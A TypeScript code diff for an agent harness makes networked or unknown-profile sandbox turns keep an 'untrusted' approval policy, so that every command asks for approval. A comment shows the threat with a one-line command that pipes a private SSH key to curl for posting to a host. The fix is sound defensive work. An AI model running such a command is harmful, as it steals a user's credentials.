@@ -269,6 +269,10 @@ export function buildTurnStartParams(input: {
   // ("invalid type: null, expected a string") and omitting it is
   // "missing field `model`". Skip the override until a model is known
   // so Codex keeps the one it chose when the thread started.
+  const profiled =
+    isCodexConfigId_l5(input.permissionsProfile) &&
+    input.intent !== "plan" &&
+    input.runtimeMode !== "full-access";
   const model = input.model?.trim() ?? "";
   const collaborationMode = model
     ? {
@@ -286,7 +290,13 @@ export function buildTurnStartParams(input: {
     approvalPolicy:
       input.intent === "plan"
         ? config.approvalPolicy
-        : commandsAlwaysPolicy(config.approvalPolicy, input.commandsAlways),
+        : commandsAlwaysPolicy(
+            config.approvalPolicy,
+            input.commandsAlways,
+            // A named profile sets its own sandbox, whose network MonoCode
+            // cannot see: it counts as networked.
+            profiled || sandboxHasNetwork(config.sandboxPolicy),
+          ),
     approvalsReviewer: config.approvalsReviewer,
     sandboxPolicy: config.sandboxPolicy,
     ...(collaborationMode ? { collaborationMode } : {}),
@@ -307,9 +317,7 @@ export function buildTurnStartParams(input: {
     // combined with `sandboxPolicy`), so `extraDirs` and the agent-control
     // network flag no longer apply. A plan turn stays read only with no
     // profile, and full access keeps MonoCode's own policy.
-    ...(isCodexConfigId_l5(input.permissionsProfile) &&
-    input.intent !== "plan" &&
-    input.runtimeMode !== "full-access"
+    ...(profiled
       ? { permissions: input.permissionsProfile, sandboxPolicy: undefined }
       : {}),
   };
@@ -327,12 +335,28 @@ export function buildTurnStartParams(input: {
  * it outside, and still asks for one that wants to leave the sandbox or that
  * it flags as dangerous. Those requests go to the card. Other modes are
  * unchanged: they already use `on-request` or never ask.
+ *
+ * The read-only sandbox still reads every file. With network access on (an
+ * orchestration lead or an /operator thread, or a named permissions profile
+ * MonoCode cannot see into) a sandboxed command could send any file out
+ * (`cat ~/.ssh/id_ed25519 | curl -d @- host`), so such a turn keeps
+ * `untrusted` and every command asks.
  */
 export function commandsAlwaysPolicy(
   policy: CodexThreadConfig["approvalPolicy"],
   commandsAlways: boolean | undefined,
+  networked = false,
 ): CodexThreadConfig["approvalPolicy"] {
-  return commandsAlways && policy === "untrusted" ? "on-request" : policy;
+  return commandsAlways && !networked && policy === "untrusted"
+    ? "on-request"
+    : policy;
+}
+
+/** Whether a turn's sandbox may reach the network. */
+function sandboxHasNetwork(
+  policy: CodexThreadConfig["sandboxPolicy"],
+): boolean {
+  return policy.type === "dangerFullAccess" || policy.networkAccess === true;
 }
 
 /** App-server accepts image inputs, but documents need a path in text. */
